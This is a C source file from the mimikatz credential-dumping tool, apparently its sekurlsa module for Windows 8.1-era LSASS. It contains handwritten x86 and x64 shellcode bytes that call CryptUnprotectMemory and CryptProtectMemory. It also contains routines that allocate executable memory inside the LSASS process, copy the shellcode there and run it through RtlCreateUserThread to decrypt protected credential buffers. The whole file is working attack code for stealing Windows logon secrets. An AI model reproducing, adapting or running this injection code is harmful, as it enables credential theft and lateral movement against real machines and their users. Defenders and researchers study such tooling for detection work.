/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#ifdef LSASS_DECRYPT
#include "kuhl_m_sekurlsa_nt63.h"

#ifdef _M_IX86
BYTE kuhl_m_sekurlsa_nt63_decryptorCode[] = {
	0x8b, 0x44, 0x24, 0x04,			// mov	 eax, dword ptr _lpparameter$[esp-4]
	0x6a, 0x00,						// push	 0
	0xff, 0x30,						// push	 dword ptr [eax]
	0x83, 0xc0, 0x04,				// add	 eax, 4
	0x50,							// push	 eax
	0xbb, 0x00, 0x00, 0x00, 0x00,	// mov   ebx, CryptUnprotectMemory
	0xff, 0xd3,						// call  ebx
	0xc2, 0x04, 0x00				// ret   4
};
#define kuhl_m_sekurlsa_nt63_decryptorCode_Offset 13
#elif defined _M_X64
BYTE kuhl_m_sekurlsa_nt63_decryptorCode[] = {
	0x8b, 0x11,						// mov	 edx, dword ptr [rcx]
	0x45, 0x33, 0xc0,				// xor	 r8d, r8d
	0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// mov	 rax, CryptUnprotectMemory
	0x48, 0x83, 0xc1, 0x04,			// add	 rcx, 4
	0x48, 0xff, 0xe0				// rex_jmp rax
};
#define kuhl_m_sekurlsa_nt63_decryptorCode_Offset 7
#endif

PLSA_PROTECT_MEMORY kuhl_m_sekurlsa_nt63_pLsaProtectMemory = kuhl_m_sekurlsa_nt63_LsaProtectMemory, kuhl_m_sekurlsa_nt63_pLsaUnprotectMemory = kuhl_m_sekurlsa_nt63_LsaUnprotectMemory;
KULL_M_MEMORY_ADDRESS aProcessUnprotect, aProcessProtect;
FARPROC pCryptUnprotectMemory = NULL, pCryptProtectMemory = NULL;

NTSTATUS kuhl_m_sekurlsa_nt63_init()
{
	NTSTATUS status = STATUS_NOT_FOUND;
	HMODULE hModule;
	
	aProcessUnprotect.hMemory = NULL;
	aProcessUnprotect.address = NULL;
	aProcessProtect.hMemory = NULL;
	aProcessProtect.address = NULL;
	
	if(hModule = GetModuleHandle(L"crypt32"))
	{
		if(
			(pCryptProtectMemory = GetProcAddress(hModule, "CryptProtectMemory")) &&
			(pCryptUnprotectMemory = GetProcAddress(hModule, "CryptUnprotectMemory"))
			)
			status = STATUS_SUCCESS;
	}
	return status;
}

NTSTATUS kuhl_m_sekurlsa_nt63_clean()
{
	if(aProcessProtect.hMemory && aProcessProtect.address)
		kull_m_memory_free(&aProcessProtect, 0);
	if(aProcessUnprotect.hMemory && aProcessUnprotect.address)
		kull_m_memory_free(&aProcessUnprotect, 0);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_nt63_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	KULL_M_MEMORY_HANDLE  hLocalBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLocalAddr = {kuhl_m_sekurlsa_nt63_decryptorCode, &hLocalBuffer};
	aProcessUnprotect.hMemory = cLsass->hLsassMem;
	aProcessProtect.hMemory = cLsass->hLsassMem;
	
	if(kull_m_memory_alloc(&aProcessUnprotect, sizeof(kuhl_m_sekurlsa_nt63_decryptorCode), PAGE_EXECUTE_READWRITE))
	{
		*(FARPROC *)(kuhl_m_sekurlsa_nt63_decryptorCode + kuhl_m_sekurlsa_nt63_decryptorCode_Offset) = pCryptUnprotectMemory;
		if(kull_m_memory_copy(&aProcessUnprotect, &aLocalAddr, sizeof(kuhl_m_sekurlsa_nt63_decryptorCode)))
		{
			if(kull_m_memory_alloc(&aProcessProtect, sizeof(kuhl_m_sekurlsa_nt63_decryptorCode), PAGE_EXECUTE_READWRITE))
			{
				*(FARPROC *)(kuhl_m_sekurlsa_nt63_decryptorCode + kuhl_m_sekurlsa_nt63_decryptorCode_Offset) = pCryptProtectMemory;
				if(kull_m_memory_copy(&aProcessProtect, &aLocalAddr, sizeof(kuhl_m_sekurlsa_nt63_decryptorCode)))
					status = STATUS_SUCCESS;
			}
		}
	}
	return status;
}

VOID WINAPI kuhl_m_sekurlsa_nt63_LsaProtectMemory (IN PVOID Buffer, IN ULONG BufferSize)
{
	kuhl_m_sekurlsa_nt63_LsaEncryptMemory(Buffer, BufferSize, TRUE);
}

VOID WINAPI kuhl_m_sekurlsa_nt63_LsaUnprotectMemory (IN PVOID Buffer, IN ULONG BufferSize)
{
	kuhl_m_sekurlsa_nt63_LsaEncryptMemory(Buffer, BufferSize, FALSE);
}

NTSTATUS kuhl_m_sekurlsa_nt63_LsaEncryptMemory(IN PVOID Buffer, IN ULONG BufferSize, IN BOOL Encrypt)
{
	KULL_M_MEMORY_HANDLE  hLocalBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aMemoryAddr = {NULL, aProcessProtect.hMemory}, aLocalAddr = {NULL, &hLocalBuffer};
	DWORD exitCode, totalSize = sizeof(ULONG) + BufferSize;
	PKULL_M_MEMORY_ADDRESS pAddress = Encrypt ? &aProcessProtect : &aProcessUnprotect;
	NTSTATUS status;
	HANDLE hThread;
	
	if(aLocalAddr.address = LocalAlloc(LPTR, totalSize))
	{
		((PKIWI_DECRYPTOR) aLocalAddr.address)->cbData = BufferSize;
		RtlCopyMemory(((PKIWI_DECRYPTOR) aLocalAddr.address)->data, Buffer, BufferSize);

		if(kull_m_memory_alloc(&aMemoryAddr, totalSize, PAGE_READWRITE))
		{
			if(kull_m_memory_copy(&aMemoryAddr, &aLocalAddr, totalSize))
			{
				status = RtlCreateUserThread(pAddress->hMemory->pHandleProcess->hProcess, NULL, 0, 0, 0, 0, (PTHREAD_START_ROUTINE) pAddress->address, aMemoryAddr.address, &hThread, NULL);
				if(NT_SUCCESS(status))
				{
					WaitForSingleObject(hThread, INFINITE);
					if(GetExitCodeThread(hThread, &exitCode) && exitCode) // dirty BOOL
						if(kull_m_memory_copy(&aLocalAddr, &aMemoryAddr, totalSize))
							RtlCopyMemory(Buffer, ((PKIWI_DECRYPTOR) aLocalAddr.address)->data, BufferSize);
					CloseHandle(hThread);
				}
				else PRINT_ERROR(L"RtlCreateUserThread (0x%08x)\n", status);
			}							
			kull_m_memory_free(&aMemoryAddr, 0);
		}
		LocalFree(aLocalAddr.address);
	}
	return STATUS_SUCCESS;
}
#endif